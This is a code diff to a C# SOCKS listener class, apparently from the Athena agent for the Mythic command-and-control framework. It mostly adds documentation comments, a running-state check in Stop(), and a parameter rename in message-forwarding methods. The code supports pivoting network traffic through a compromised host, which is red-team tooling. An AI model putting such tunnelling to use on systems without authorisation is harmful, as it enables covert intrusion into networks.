@@ -26,6 +26,9 @@ namespace Athena.Commands.Model
             this.connections = new Dictionary<int, SocksConnection>();
         }
 
+        /// <summary>
+        /// Start the SOCKS Listener
+        /// </summary>
         public bool Start()
         {
             this.ct = new CancellationTokenSource();
@@ -70,24 +73,35 @@ namespace Athena.Commands.Model
                         }
                     }
 
+                    //Quick cleanup
                     foreach (int id in idsToRemove)
                     {
                         RemoveConnection(id);
                     }
-
                 }
             });
             return true;
         }
+
+        /// <summary>
+        /// Stops the SOCKS Listener
+        /// </summary>
         public bool Stop()
         {
             try
             {
+                if (!this.running)
+                {
+                    return true;
+                }
+
                 this.running = false;
+                
                 if (this.ct is not null)
                 {
                     this.ct.Cancel();
                 }
+                
                 return true;
             }
             catch (Exception e)
@@ -96,7 +110,11 @@ namespace Athena.Commands.Model
                 return false;
             }
         }
-
+        
+        /// <summary>
+        /// Add a connection to the tracker dictionary
+        /// </summary>
+        /// <param name="conn">Socks Connection</param>
         private bool AddConnection(SocksConnection conn)
         {
             if (Monitor.TryEnter(_dictLock, 5000))
@@ -107,6 +125,11 @@ namespace Athena.Commands.Model
             }
             return false;
         }
+
+        /// <summary>
+        /// Remove connection from the tracker dictionary
+        /// </summary>
+        /// <param name="conn">Connection ID</param>
         private bool RemoveConnection(int conn)
         {
             if (Monitor.TryEnter(_dictLock, 5000))
@@ -121,7 +144,10 @@ namespace Athena.Commands.Model
             }
             return false;
         }
-        
+
+        /// <summary>
+        /// Get messages from the out dictionary to forward to the Mythic server
+        /// </summary>
         public List<SocksMessage> GetMessages()
         {
             if(this.messagesOut.Count < 1)
@@ -139,11 +165,19 @@ namespace Athena.Commands.Model
             msgOut.Reverse();
             return msgOut;
         }
+
+        /// <summary>
+        /// Return the number of messages available to return to the Mythic server
+        /// </summary>
         public int Count()
         {
             return this.messagesOut.Count();
         }
-        
+
+        /// <summary>
+        /// Handle a new message forwarded from the Mythic server
+        /// </summary>
+        /// <param name="sm">Socks Message</param>
         public void HandleMessage(SocksMessage sm)
         {
             if (this.connections.ContainsKey(sm.server_id))
@@ -171,6 +205,12 @@ namespace Athena.Commands.Model
                 HandleNewConnection(sm);
             }
         }
+
+        /// <summary>
+        /// Handle a new connection forwarded from the Mythic server
+        /// </summary>
+        /// <param name="address">IP address</param>
+        /// <param name="sm">Socks Message</param>
         private void HandleNewConnection(SocksMessage sm)
         {
             try
@@ -230,16 +270,21 @@ namespace Athena.Commands.Model
                 };
             }
         }
-        public void ReturnMessage(SocksMessage message)
+
+        /// <summary>
+        /// Add a message to the out queue to be returned to the Mythic server
+        /// </summary>
+        /// <param name="sm">Socks Message</param>
+        public void ReturnMessage(SocksMessage sm)
         {
             if (Monitor.TryEnter(_lock, 5000))
             {
-                this.messagesOut.Add(message);
+                this.messagesOut.Add(sm);
                 Monitor.Exit(_lock);
             }
-            if (message.exit)
+            if (sm.exit)
             {
-                this.connections[message.server_id].exited = true;
+                this.connections[sm.server_id].exited = true;
             }
         }
     }
